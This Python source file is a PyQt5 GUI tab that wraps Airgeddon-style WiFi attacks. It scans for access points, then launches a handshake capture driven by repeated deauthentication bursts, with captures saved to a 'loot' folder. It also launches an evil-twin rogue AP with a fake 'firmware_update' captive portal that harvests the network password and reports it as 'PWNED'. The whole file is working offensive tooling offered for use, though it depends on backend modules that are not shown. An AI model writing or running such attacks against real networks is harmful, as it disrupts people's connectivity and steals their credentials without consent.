"""
Airgeddon GUI Tab — A visually pleasing, fully functional point-and-click wrapper
for Airgeddon's core workflows (Recon, Handshake, Evil Twin), built natively.
"""

from pathlib import Path
import time
import os
import shutil

from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QPushButton,
    QLabel,
    QGroupBox,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QSplitter,
    QComboBox,
    QPlainTextEdit,
    QShortcut,
    QApplication,
)
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QKeySequence

from james.gui.toast import show_toast
from james.gui.utils.worker import WorkerThread


class AirgeddonTab(QWidget):
    """Point-and-click GUI for Airgeddon-style WiFi attacks."""

    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.orchestrator = main_window.orchestrator
        self.pineap = getattr(self.orchestrator, "pineap", None)

        # State
        self.worker = None
        self.recon_proc = None
        self._attack_active = False

        self.selected_bssid = None
        self.selected_essid = None
        self.selected_channel = None

        self._build_ui()
        self._connect_signals()
        self._build_shortcuts()


    def _build_shortcuts(self):
        sc_r = QShortcut(QKeySequence("Ctrl+R"), self)
        sc_r.setContext(Qt.WidgetWithChildrenShortcut)
        sc_r.activated.connect(self.btn_refresh.click)

        sc_s = QShortcut(QKeySequence("Ctrl+S"), self)
        sc_s.setContext(Qt.WidgetWithChildrenShortcut)
        sc_s.activated.connect(self._toggle_scan)

        ap_copy = QShortcut(QKeySequence("Ctrl+C"), self.ap_table)
        ap_copy.setContext(Qt.WidgetShortcut)
        ap_copy.activated.connect(self._copy_selected)

    def _toggle_scan(self):
        if self.btn_scan_start.isEnabled():
            self.btn_scan_start.click()
        elif self.btn_scan_stop.isEnabled():
            self.btn_scan_stop.click()

    def _copy_selected(self):
        if self.ap_table.hasFocus():
            row = self.ap_table.currentRow()
            if row >= 0:
                bssid = (self.ap_table.item(row, 1) or QTableWidgetItem("")).text()
                if bssid:
                    QApplication.clipboard().setText(bssid)
                    show_toast(self.main_window, "BSSID copied", "info")

    def _build_ui(self):
        # Inherit the global Design System v3 stylesheet (no inline override)
        layout = QVBoxLayout(self)
        layout.setContentsMargins(20, 16, 20, 16)
        layout.setSpacing(14)

        # Header
        title_lbl = QLabel("Airgeddon  —  Visual Attack GUI")
        title_lbl.setObjectName("sectionLabel")
        layout.addWidget(title_lbl)

        # Interface Bar
        iface_group = QGroupBox("1. Interface Setup")
        iface_layout = QHBoxLayout(iface_group)
        iface_layout.addWidget(QLabel("Select Interface:"))
        self.iface_combo = QComboBox()
        self.iface_combo.setMinimumWidth(200)
        self.iface_combo.setStyleSheet("background: #2d2d3d; color: white;")
        iface_layout.addWidget(self.iface_combo)

        self.btn_refresh = QPushButton("↻ Refresh")
        self.btn_refresh.setToolTip("Refresh network interfaces (Ctrl+R)")
        self.btn_refresh.setMinimumHeight(30)
        iface_layout.addWidget(self.btn_refresh)
        iface_layout.addStretch()
        layout.addWidget(iface_group)

        # Main Workspace Splitter
        splitter = QSplitter(Qt.Vertical)

        # Recon Area
        recon_group = QGroupBox("2. Visual Reconnaissance")
        recon_layout = QVBoxLayout(recon_group)

        btn_bar = QHBoxLayout()
        self.btn_scan_start = QPushButton("▶ Start Network Scan")
        self.btn_scan_start.setToolTip("Start network scan (Ctrl+S)")
        self.btn_scan_start.setMinimumHeight(40)
        self.btn_scan_stop = QPushButton("⏹ Stop Scan")
        self.btn_scan_stop.setToolTip("Stop network scan (Ctrl+S)")
        self.btn_scan_stop.setMinimumHeight(40)
        self.btn_scan_stop.setEnabled(False)
        self.lbl_stats = QLabel("APs: 0")
        self.lbl_stats.setStyleSheet("color: #00e676; font-weight: bold;")

        btn_bar.addWidget(self.btn_scan_start)
        btn_bar.addWidget(self.btn_scan_stop)
        btn_bar.addStretch()
        btn_bar.addWidget(self.lbl_stats)
        recon_layout.addLayout(btn_bar)

        self.ap_table = QTableWidget(0, 5)
        self.ap_table.setHorizontalHeaderLabels(
            ["ESSID", "BSSID", "CH", "ENC", "PWR"]
        )
        self.ap_table.horizontalHeader().setSectionResizeMode(
            0, QHeaderView.Stretch
        )
        self.ap_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.ap_table.setSelectionMode(QTableWidget.SingleSelection)
        self.ap_table.setEditTriggers(QTableWidget.NoEditTriggers)
        recon_layout.addWidget(self.ap_table)
        splitter.addWidget(recon_group)

        # Attack Area
        attack_group = QGroupBox("3. Attack Modules")
        attack_layout = QVBoxLayout(attack_group)

        self.lbl_target = QLabel(
            "Target: None selected — select an AP from the scan table"
        )
        self.lbl_target.setObjectName("dimLabel")
        attack_layout.addWidget(self.lbl_target)

        attack_btns = QHBoxLayout()
        self.btn_capture = QPushButton("🎯 1. Capture Handshake")
        self.btn_capture.setMinimumHeight(44)
        self.btn_capture.setObjectName("secondaryBtn")
        self.btn_capture.setEnabled(False)

        self.btn_evil_twin = QPushButton("👿 2. Launch Evil Twin")
        self.btn_evil_twin.setMinimumHeight(44)
        self.btn_evil_twin.setObjectName("dangerBtn")
        self.btn_evil_twin.setEnabled(False)

        self.btn_wps = QPushButton("🔓 3. WPS Pixie Dust")
        self.btn_wps.setMinimumHeight(44)
        self.btn_wps.setObjectName("secondaryBtn")
        self.btn_wps.setEnabled(False)

        self.btn_abort_attack = QPushButton("🛑 Abort Attack")
        self.btn_abort_attack.setMinimumHeight(44)
        self.btn_abort_attack.setObjectName("warnBtn")
        self.btn_abort_attack.setEnabled(False)

        attack_btns.addWidget(self.btn_capture)
        attack_btns.addWidget(self.btn_evil_twin)
        attack_btns.addWidget(self.btn_wps)
        attack_btns.addWidget(self.btn_abort_attack)
        attack_layout.addLayout(attack_btns)
        splitter.addWidget(attack_group)

        # Visual Log Output
        log_group = QGroupBox("Airgeddon Event Log")
        log_layout = QVBoxLayout(log_group)
        self.log_output = QPlainTextEdit()
        self.log_output.setReadOnly(True)
        from james.gui.theme import LOG_STYLE

        self.log_output.setStyleSheet(LOG_STYLE)
        log_layout.addWidget(self.log_output)
        splitter.addWidget(log_group)

        splitter.setStretchFactor(0, 2)
        splitter.setStretchFactor(1, 1)
        splitter.setStretchFactor(2, 1)
        layout.addWidget(splitter)

        # Poll timer for recon
        self.poll_timer = QTimer(self)
        self.poll_timer.timeout.connect(self._do_poll)

        QTimer.singleShot(200, self._refresh_interfaces)

    def _connect_signals(self):
        self.btn_refresh.clicked.connect(self._refresh_interfaces)
        self.btn_scan_start.clicked.connect(self._start_scan)
        self.btn_scan_stop.clicked.connect(self._stop_scan)
        self.ap_table.itemSelectionChanged.connect(self._on_target_selected)

        self.btn_capture.clicked.connect(self._do_handshake_capture)
        self.btn_evil_twin.clicked.connect(self._do_evil_twin)
        self.btn_wps.clicked.connect(self._do_wps_attack)
        self.btn_abort_attack.clicked.connect(self._abort_attack)

    def _log(self, text):
        self.log_output.appendPlainText(f"[*] {text}")
        sb = self.log_output.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _do_wps_attack(self):
        self._log("--- AIRGEDDON WPS MODULE ---")
        self._log("WPS Pixie Dust / PIN attacks coming in future update.")
        show_toast(
            self.main_window,
            "WPS module requires additional dependencies (Reaver/Bully).",
            "warning",
        )

    def _refresh_interfaces(self):
        self.iface_combo.clear()
        try:
            ifaces = self.orchestrator.wifi_interfaces()
            for ifc in ifaces:
                self.iface_combo.addItem(
                    f"{ifc['interface']} ({ifc.get('mode', '?')})",
                    ifc["interface"],
                )
        except Exception as e:
            self._log(f"Error fetching interfaces: {e}")

    def _start_scan(self):
        iface = self.iface_combo.currentData()
        if not iface:
            return show_toast(
                self.main_window, "No interface selected", "error"
            )

        try:
            mon_iface = self.orchestrator.ensure_monitor_mode(iface)
        except Exception as e:
            return show_toast(
                self.main_window, f"Monitor mode error: {e}", "error"
            )

        self.orchestrator.layer.run("rm -f /tmp/airgeddon_recon*")
        self.recon_proc = self.orchestrator.aircrack.start_airodump(
            mon_iface, write_prefix="/tmp/airgeddon_recon"
        )
        self.poll_timer.start(2500)

        self.btn_scan_start.setEnabled(False)
        self.btn_scan_stop.setEnabled(True)
        self._log(f"Started visual reconnaissance on {mon_iface}...")

    def _stop_scan(self):
        self.poll_timer.stop()
        if self.recon_proc:
            try:
                self.orchestrator.layer.kill_background(self.recon_proc)
            except:
                pass
            self.recon_proc = None
        self.btn_scan_start.setEnabled(True)
        self.btn_scan_stop.setEnabled(False)
        self._log("Stopped visual reconnaissance.")

    def _do_poll(self):
        csv_file = "/tmp/airgeddon_recon-01.csv"
        if not os.path.exists(csv_file):
            return
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                data = self.orchestrator.aircrack.parse_airodump_csv(f.read())
        except:
            return

        aps = [
            a
            for a in data.get("aps", [])
            if a.get("bssid", "").count(":") == 5
        ]
        aps.sort(key=lambda x: x.get("power", -100), reverse=True)
        self.lbl_stats.setText(f"APs: {len(aps)}")

        self.ap_table.setRowCount(len(aps))
        for i, ap in enumerate(aps):
            self.ap_table.setItem(i, 0, QTableWidgetItem(ap.get("essid", "")))
            self.ap_table.setItem(i, 1, QTableWidgetItem(ap.get("bssid", "")))
            self.ap_table.setItem(
                i, 2, QTableWidgetItem(str(ap.get("channel", "")))
            )
            self.ap_table.setItem(
                i, 3, QTableWidgetItem(ap.get("privacy", ""))
            )
            self.ap_table.setItem(
                i, 4, QTableWidgetItem(str(ap.get("power", "")))
            )

    def _on_target_selected(self):
        rows = self.ap_table.selectedItems()
        if not rows:
            return
        r = rows[0].row()
        self.selected_essid = self.ap_table.item(r, 0).text()
        self.selected_bssid = self.ap_table.item(r, 1).text()
        self.selected_channel = self.ap_table.item(r, 2).text()

        self.lbl_target.setText(
            f"{self.selected_essid}  ·  {self.selected_bssid}  ·  ch {self.selected_channel}"
        )
        self.lbl_target.setObjectName("goldAccent")
        self.lbl_target.style().unpolish(self.lbl_target)
        self.lbl_target.style().polish(self.lbl_target)

        if not self._attack_active:
            self.btn_capture.setEnabled(True)
            self.btn_evil_twin.setEnabled(True)
            self.btn_wps.setEnabled(True)

    def _set_attack_state(self, active: bool):
        self._attack_active = active
        self.btn_capture.setEnabled(
            not active and self.selected_bssid is not None
        )
        self.btn_evil_twin.setEnabled(
            not active and self.selected_bssid is not None
        )
        self.btn_wps.setEnabled(not active and self.selected_bssid is not None)
        self.btn_abort_attack.setEnabled(active)
        self.btn_scan_start.setEnabled(
            not active and not self.poll_timer.isActive()
        )

    def _abort_attack(self):
        self._attack_active = False
        self._log("User requested attack abort. Stopping workers...")
        if self.worker and self.worker.isRunning():
            self.worker.terminate()
            self.worker.wait()
        # Clean up interfaces and pineap
        if hasattr(self, "pineap") and self.pineap:
            self.pineap.stop_all()
        self._log("Attack aborted successfully.")
        self._set_attack_state(False)

    def _do_handshake_capture(self):
        iface = self.iface_combo.currentData()
        bssid, ch, essid = (
            self.selected_bssid,
            self.selected_channel,
            self.selected_essid,
        )
        if not iface or not bssid:
            return

        self._stop_scan()
        self._set_attack_state(True)
        self.log_output.clear()
        self._log(f"--- AIRGEDDON HANDSHAKE MODULE ---")
        self._log(f"Target: {essid} ({bssid})")

        def task():
            try:
                mon = self.orchestrator.ensure_monitor_mode(iface)
                self.main_window.log_signal.emit(
                    f"[Airgeddon] Switched {iface} to {mon}"
                )

                prefix = f"/tmp/ag_cap_{bssid.replace(':','')}"
                self.orchestrator.layer.run(f"rm -f {prefix}*")

                proc = self.orchestrator.aircrack.start_airodump(
                    mon, channel=int(ch), bssid=bssid, write_prefix=prefix
                )
                self.main_window.log_signal.emit(
                    f"[Airgeddon] Sniffing on CH {ch}..."
                )

                cap_file = f"{prefix}-01.cap"
                found = False
                for i in range(1, 6):
                    if not self._attack_active:
                        break
                    self.main_window.log_signal.emit(
                        f"[Airgeddon] Sending Deauth Burst {i}/5..."
                    )
                    self.orchestrator.aircrack.deauth(mon, bssid, count=10)
                    time.sleep(10)

                    if Path(
                        cap_file
                    ).exists() and self.orchestrator.aircrack.check_handshake(
                        cap_file, bssid
                    ):
                        found = True
                        break

                self.orchestrator.layer.kill_background(proc)

                if found:
                    dest = f"{Path.home()}/.james/loot/handshakes/{essid}_{bssid.replace(':','')}.cap"
                    shutil.copy2(cap_file, dest)
                    return f"SUCCESS: Handshake captured and saved to {dest}"
                return "FAIL: Could not capture handshake."
            except Exception as e:
                return f"ERROR: {e}"

        self.worker = WorkerThread(task)
        self.worker.finished.connect(self._on_attack_done)
        self.worker.start()

    def _do_evil_twin(self):
        iface = self.iface_combo.currentData()
        bssid, ch, essid = (
            self.selected_bssid,
            self.selected_channel,
            self.selected_essid,
        )
        if not iface or not bssid:
            return

        self._stop_scan()
        self._set_attack_state(True)
        self.log_output.clear()
        self._log(f"--- AIRGEDDON EVIL TWIN MODULE ---")
        self._log(f"Target: {essid} ({bssid})")

        if not self.pineap:
            self._log(
                "ERROR: PineAP backend not initialized. Cannot launch Evil Twin."
            )
            self._set_attack_state(False)
            return

        def task():
            try:
                # 1. Restore managed mode for hostapd
                self.orchestrator.layer.run(
                    f"airmon-ng stop {iface}", sudo=True
                )
                # Need to use raw interface name if it ended with 'mon'
                base_iface = iface.replace("mon", "")
                self.main_window.log_signal.emit(
                    f"[Airgeddon] Launching Rogue AP on {base_iface}..."
                )

                # 2. Start Portal
                from james.tools.pineap import CREDS_LOG

                if CREDS_LOG.exists():
                    CREDS_LOG.unlink()
                self.pineap.stop_all()

                self.pineap.start_karma_with_portal(
                    interface=base_iface,
                    channel=int(ch),
                    ssid=essid,
                    portal="firmware_update",
                    bssid=bssid,
                )

                self.main_window.log_signal.emit(
                    f"[Airgeddon] Evil Twin Active! Awaiting credentials..."
                )

                # 3. Wait for credentials
                timeout = 600  # 10 mins
                start_time = time.time()
                while (
                    time.time() - start_time < timeout and self._attack_active
                ):
                    time.sleep(3)
                    creds = self.pineap.get_creds()
                    for cred in creds:
                        pwd = cred.get("password")
                        if pwd:
                            self.pineap.stop_all()
                            return f"PWNED: Password harvested: {pwd}"

                self.pineap.stop_all()
                return "FAIL: Timed out waiting for credentials."

            except Exception as e:
                return f"ERROR: {e}"

        self.worker = WorkerThread(task)
        self.worker.finished.connect(self._on_attack_done)
        self.worker.start()

    def _on_attack_done(self, result):
        self._set_attack_state(False)
        self._log(f"RESULT: {result}")
        if "PWNED" in str(result) or "SUCCESS" in str(result):
            show_toast(self.main_window, str(result), "success")
        else:
            show_toast(self.main_window, str(result), "error")
